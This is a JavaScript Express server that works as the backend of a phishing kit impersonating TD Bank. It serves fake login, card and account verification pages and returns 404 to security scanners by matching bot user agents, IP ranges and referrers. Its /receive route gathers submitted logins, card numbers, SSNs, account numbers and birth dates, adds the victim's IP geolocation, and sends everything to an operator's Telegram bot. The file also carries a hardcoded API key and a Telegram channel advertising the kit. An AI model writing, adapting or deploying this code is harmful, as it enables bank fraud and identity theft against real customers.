const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const { botToken, chatId, redirect_url } = require('./config/settings.js');
//const { getClientIp } = require("request-ip");
const https = require('https');
const querystring = require('querystring');
const axios = require('axios');
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const fs = require('fs').promises;
const MobileDetect = require('mobile-detect');
const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');
const { use } = require('express/lib/router');
const { sendMessageFor } = require('simple-telegram-message');
const viewDir = path.join(__dirname, 'views');

const port = 3000;

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.set('trust proxy', true);

function getClientIp(req) {
  const xForwardedFor = req.headers['x-forwarded-for'];
  if (xForwardedFor) {
    const ips = xForwardedFor.split(',');
    return ips[0].trim();
  }
  return req.connection.remoteAddress || req.socket.remoteAddress || null;
}

// Middleware function for mobile detection
app.use((req, res, next) => {
  const md = new MobileDetect(req.headers['user-agent']);
  req.isMobile = md.mobile();
  next();
});

// Middleware function for bot detection
function isBotUA(userAgent) {
  if (!userAgent) {
    userAgent = '';
  }

  if (isbot(userAgent)) {
    return true;
  }

  for (let i = 0; i < botUAList.length; i++) {
    if (userAgent.toLowerCase().includes(botUAList[i])) {
      return true;
    }
  }

  return false;
}

function isBotIP(ipAddress) {
  if (!ipAddress) {
    ipAddress = '';
  }

  if (ipAddress.substr(0, 7) == '::ffff:') {
    ipAddress = ipAddress.substr(7);
  }

  for (let i = 0; i < botIPList.length; i++) {
    if (ipAddress.includes(botIPList[i])) {
      return true;
    }
  }

  function IPtoNum(ip) {
    return Number(
      ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
    );
  }

  const inRange = botIPRangeList.some(
    ([min, max]) =>
      IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
  );

  if (inRange) {
    return true;
  }

  for (let i = 0; i < botIPCIDRRangeList.length; i++) {
    if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
      return true;
    }
  }

  for (let i = 0; i < botIPWildcardRangeList.length; i++) {
    if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
      return true;
    }
  }

  return false;
}

function isBotRef(referer) {
  if (!referer) {
    referer = '';
  }

  for (let i = 0; i < botRefList.length; i++) {
    if (referer.toLowerCase().includes(botRefList[i])) {
      return true;
    }
  }
  return false;
}

app.use((req, res, next) => {
  const clientUA = req.headers['user-agent'] || req.get('user-agent');
  const clientIP = getClientIp(req);
  const clientRef = req.headers.referer || req.headers.origin;

  try {
    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
      console.log(`Blocked request: User-Agent: ${clientUA}, IP: ${clientIP}, Referrer: ${clientRef}`);
      return res.status(404).send('Not Found');
    } else {
      next();
    }
  } catch (error) {
    console.error('Error in bot detection middleware:', error);
    res.status(500).send('Internal Server Error');
  }
});


app.use((req, res, next) => {
    if (req.method === 'GET' && req.path.includes('.html')) {
        // Redirect to the desired path, for example, the root path
        res.redirect('/');
        console.log('path')
    } else {
        next();
    }
});


// Route handler for form submission
app.post('/receive', async (req, res) => {
    let message = '';
    let responseSent = false; // Flag to prevent multiple responses
    const myObject = req.body;

    const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(`${URL}${ipAddress}&localityLanguage=en&key=${ApiKey}`);
        console.log(apiResponse.data);
        return apiResponse.data;
    };

    try {
        const ipAddress = getClientIp(req);
        const ipAddressInformation = await sendAPIRequest(ipAddress);
        const userAgent = req.headers["user-agent"];
        const systemLang = req.headers["accept-language"];

        const myObjects = Object.keys(myObject).map(key => key.toLowerCase());

        const fullGeoInfo = `🌍 GEO-IP INFO\n` +
            `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
            `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
            `CITY             : ${ipAddressInformation.location.city}\n` +
            `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
            `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
            `COUNTRY          : ${ipAddressInformation.country.name}\n` +
            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
            `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
            `💻 SYSTEM INFO\n` +
            `USER AGENT       : ${userAgent}\n` +
            `SYSTEM LANGUAGE  : ${systemLang}\n\n`;

        const basicGeoInfo = `🌍 GEO-IP INFO\n` +
            `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
            `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n\n`;

        const prepareMessage = (header, type, includeFullGeo = false) => {
            message += `👤 ${header} \n\n` +
                `========================\n\n`;

            for (const key of Object.keys(myObject)) {
                if (key.toLowerCase() !== 'visitor' && myObject[key] !== "") {
                    console.log(`${key}: ${myObject[key]}`);
                    message += `${key.toUpperCase()}: ${myObject[key]}\n`;
                }
            }

            message += `\n========================\n\n` +
                (includeFullGeo ? fullGeoInfo : basicGeoInfo) +
                `========================\n\n` +
                `✅ UPDATE TEAM | TDBANK\n` +
                `💬 Telegram: https://t.me/updteams\n`;
            res.send({ url: type });
            responseSent = true;
        };

        if (!responseSent && (myObjects.includes('userid'))) {
            prepareMessage("LOGIN", "/verify?action=1", true);
        }

        if (!responseSent && (myObjects.includes('expiryDate') || myObjects.includes('cardNumber') )) {
            prepareMessage("CARD INFO", "/verify?action=4" , false);
        }
        

        if (!responseSent && (myObjects.includes('ssn') || myObjects.includes('accountNumber') || myObjects.includes('email'))) {
            prepareMessage("ACCOUNT INFO", "/verify?action=3", false);
        }
        
        if (!responseSent && myObjects.includes('dob')) {
		    prepareMessage("ACCOUNT INFO", "/verify?action=2", false);
		}

        // Handle unmatched cases
        if (!responseSent) {
            res.status(400).send({ error: "No matching keys found in request body." });
            responseSent = true;
        }

        // Send message to bot
        const sendMessage = sendMessageFor(botToken, chatId);
        await sendMessage(message);

        console.log(message);
    } catch (error) {
        if (!responseSent) {
            res.status(500).send({ error: "Internal server error" });
        }
        console.error(error);
    }
});



// Route handler for login pages
app.get('/login', async (req, res) => {
  try {
    let htmlContent;
    const fileName = `Index.html`;
    htmlContent = await fs.readFile(path.join(__dirname, 'views', fileName), 'utf-8');
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});

app.get('/verify', (req, res) => {
  const action = req.query.action;

  switch (action) {
    case '1':
      res.sendFile(path.join(viewDir, 'enroll.html'));
      break;
      
    case '2':
      
      res.sendFile(path.join(viewDir, 'acc.html'));
      break;
    
   case '3':
      
      res.sendFile(path.join(viewDir, 'card.html'));
      break;
      
    default:
    
      res.redirect('/login');
      break;
  }
});

app.get('/', async (req, res) => {
  res.redirect('/login');
});

// Middleware function for bot detection
function antiBotMiddleware(req, res, next) {
  const clientUA = req.headers['user-agent'] || req.get('user-agent');
  const clientIP = getClientIp(req);
  const clientRef = req.headers.referer || req.headers.origin;

  if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
    return res.status(404).send('Not Found');
  } else {
    next();
  }
}

app.use(antiBotMiddleware);